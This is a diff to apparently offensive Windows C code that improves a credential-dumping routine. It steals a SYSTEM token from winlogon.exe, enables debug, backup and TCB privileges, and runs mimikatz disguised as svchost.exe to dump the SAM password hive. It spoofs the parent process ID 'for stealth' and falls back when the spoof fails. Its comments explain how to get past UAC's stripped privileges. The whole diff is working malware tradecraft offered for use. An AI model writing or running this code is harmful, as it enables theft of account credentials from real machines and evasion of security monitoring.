@@ -4,9 +4,12 @@
 #include <tlhelp32.h>
 #include <urlmon.h>
 #include <shlobj.h>
+#include <wtsapi32.h>
 #include "payload_extract.h"
 
 #pragma comment(lib, "urlmon.lib")
+#pragma comment(lib, "advapi32.lib")
+#pragma comment(lib, "wtsapi32.lib")
 
 BOOL WINAPI IsUserAnAdmin(void);
 
@@ -80,48 +83,85 @@ static void stage_payload(void) {
     audit("[*] Temp zip removed: %s", zipPath);
 }
 
+static void enable_priv(HANDLE tok, const char *name) {
+    LUID luid;
+    if (LookupPrivilegeValueA(NULL, name, &luid)) {
+        TOKEN_PRIVILEGES tp = { .PrivilegeCount = 1 };
+        tp.Privileges[0].Luid = luid;
+        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+        AdjustTokenPrivileges(tok, FALSE, &tp, sizeof(tp), NULL, NULL);
+    }
+}
+
 static void launch_mimikatz(void) {
     char svchost[MAX_PATH], dump[MAX_PATH], cmd[MAX_PATH];
     wsprintfA(svchost, "%s\\svchost.exe", g_dir);
     wsprintfA(dump, "%s\\sam_dump.txt", g_dir);
-    // ponytail: capture via redirected stdout (STARTF_USESTDHANDLES) without
-    // CREATE_NO_WINDOW, which previously detached mimikatz from the handles.
-    // lsadump::sam needs SeBackupPrivilege; mimicatz only auto-enables
-    // SeDebugPrivilege, so enable both first.
+    // ponytail: lsadump::sam needs SeBackupPrivilege to read HKLM\SAM. Under a
+    // UAC-filtered admin token that privilege is STRIPPED (not just disabled),
+    // so `privilege::backup` can't enable it -> 0x5 ACCESS_DENIED, empty dump.
+    // Steal a SYSTEM token (winlogon) and run mimikatz as SYSTEM, which owns
+    // the SAM hive. PPID-spoof the SYSTEM parent for stealth.
     DeleteFileA(dump);
-    wsprintfA(cmd, "\"%s\" \"privilege::debug\" \"privilege::backup\" \"lsadump::sam\" \"exit\"", svchost);
+    wsprintfA(cmd, "\"%s\" \"lsadump::sam\" \"exit\"", svchost);
 
-    DWORD pid = find_pid_by_name("explorer.exe");
-    if (!pid) pid = find_pid_by_name("winlogon.exe");
-    if (!pid) { audit("[-] No stable parent process found for PPID spoofing"); return; }
+    DWORD pid = find_pid_by_name("winlogon.exe");
+    if (!pid) pid = find_pid_by_name("explorer.exe");
+    if (!pid) { audit("[-] No SYSTEM parent process found"); return; }
 
-    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, pid);
-    if (!hParent) { audit("[-] OpenProcess failed (%lu)", GetLastError()); return; }
-    audit("[+] Using %s (PID: %lu) as spoofed parent", (pid ? "explorer/winlogon" : "?"), pid);
+    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE, FALSE, pid);
+    if (!hProc) { audit("[-] OpenProcess(%lu) failed (%lu)", pid, GetLastError()); return; }
+
+    HANDLE hToken = NULL;
+    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY | TOKEN_ADJUST_PRIVILEGES, &hToken)) {
+        audit("[-] OpenProcessToken failed (%lu)", GetLastError());
+        CloseHandle(hProc); return;
+    }
+    HANDLE hSys = NULL;
+    if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hSys)) {
+        audit("[-] DuplicateTokenEx failed (%lu)", GetLastError());
+        CloseHandle(hToken); CloseHandle(hProc); return;
+    }
+    enable_priv(hSys, SE_DEBUG_NAME);
+    enable_priv(hSys, SE_BACKUP_NAME);
+    enable_priv(hSys, SE_TCB_NAME);
+    audit("[+] Got SYSTEM token from PID %lu", pid);
+
+    DWORD sess = WTSGetActiveConsoleSessionId();
+    if (sess != 0xFFFFFFFF)
+        SetTokenInformation(hSys, TokenSessionId, &sess, sizeof(sess));
 
     SIZE_T attrSize = 0;
     InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
     PPROC_THREAD_ATTRIBUTE_LIST attrList = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, attrSize);
-    if (!attrList) { CloseHandle(hParent); return; }
-
-    if (!InitializeProcThreadAttributeList(attrList, 1, 0, &attrSize)) {
-        audit("[-] InitializeProcThreadAttributeList failed (%lu)", GetLastError());
-        HeapFree(GetProcessHeap(), 0, attrList); CloseHandle(hParent); return;
+    if (attrList) {
+        if (InitializeProcThreadAttributeList(attrList, 1, 0, &attrSize) &&
+            UpdateProcThreadAttribute(attrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hProc, sizeof(HANDLE), NULL, NULL))
+            audit("[+] PPID attribute set (SYSTEM parent)");
+        else
+            audit("[-] UpdateProcThreadAttribute failed (%lu)", GetLastError());
     }
-    if (!UpdateProcThreadAttribute(attrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL)) {
-        audit("[-] UpdateProcThreadAttribute failed (%lu)", GetLastError());
-        DeleteProcThreadAttributeList(attrList); HeapFree(GetProcessHeap(), 0, attrList); CloseHandle(hParent); return;
-    }
-    audit("[+] PPID attribute set");
 
     STARTUPINFOEXA si = { .StartupInfo = { .cb = sizeof(si) } };
-    si.lpAttributeList = attrList;
+    if (attrList) si.lpAttributeList = attrList;
     si.StartupInfo.dwFlags = STARTF_USESTDHANDLES;
     HANDLE hOut = CreateFileA(dump, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hOut != INVALID_HANDLE_VALUE) { si.StartupInfo.hStdOutput = hOut; si.StartupInfo.hStdError = hOut; }
+    if (hOut != INVALID_HANDLE_VALUE) {
+        SetHandleInformation(hOut, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);
+        si.StartupInfo.hStdOutput = hOut; si.StartupInfo.hStdError = hOut;
+    }
+
     PROCESS_INFORMATION pi;
-    if (CreateProcessA(svchost, cmd, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT, NULL, g_dir, &si.StartupInfo, &pi)) {
-        audit("[+] svchost.exe (mimikatz) launched (PID: %lu) — dumping SAM -> %s", pi.dwProcessId, dump);
+    BOOL ok = CreateProcessAsUserA(hSys, svchost, cmd, NULL, NULL, TRUE,
+                                   EXTENDED_STARTUPINFO_PRESENT, NULL, g_dir, &si.StartupInfo, &pi);
+    if (!ok && attrList) {
+        // retry without PPID spoof if that was the blocker
+        si.lpAttributeList = NULL;
+        ok = CreateProcessAsUserA(hSys, svchost, cmd, NULL, NULL, TRUE,
+                                  EXTENDED_STARTUPINFO_PRESENT, NULL, g_dir, &si.StartupInfo, &pi);
+    }
+    if (ok) {
+        audit("[+] svchost.exe (mimikatz/SYSTEM) launched (PID: %lu) — dumping SAM -> %s", pi.dwProcessId, dump);
         CloseHandle(pi.hThread);
         WaitForSingleObject(pi.hProcess, INFINITE);
         CloseHandle(pi.hProcess);
@@ -130,12 +170,15 @@ static void launch_mimikatz(void) {
         if (sz) audit("[+] SAM dump completed (%lu bytes) -> %s", sz, dump);
         else    audit("[-] SAM dump empty (0 bytes) -> %s", dump);
     } else {
-        audit("[-] CreateProcess svchost.exe failed (%lu)", GetLastError());
+        audit("[-] CreateProcessAsUser svchost.exe failed (%lu)", GetLastError());
     }
+
     if (hOut != INVALID_HANDLE_VALUE) CloseHandle(hOut);
-    DeleteProcThreadAttributeList(attrList);
-    HeapFree(GetProcessHeap(), 0, attrList);
-    CloseHandle(hParent);
+    if (attrList) DeleteProcThreadAttributeList(attrList);
+    if (attrList) HeapFree(GetProcessHeap(), 0, attrList);
+    CloseHandle(hSys);
+    CloseHandle(hToken);
+    CloseHandle(hProc);
 }
 
 int main(void) {
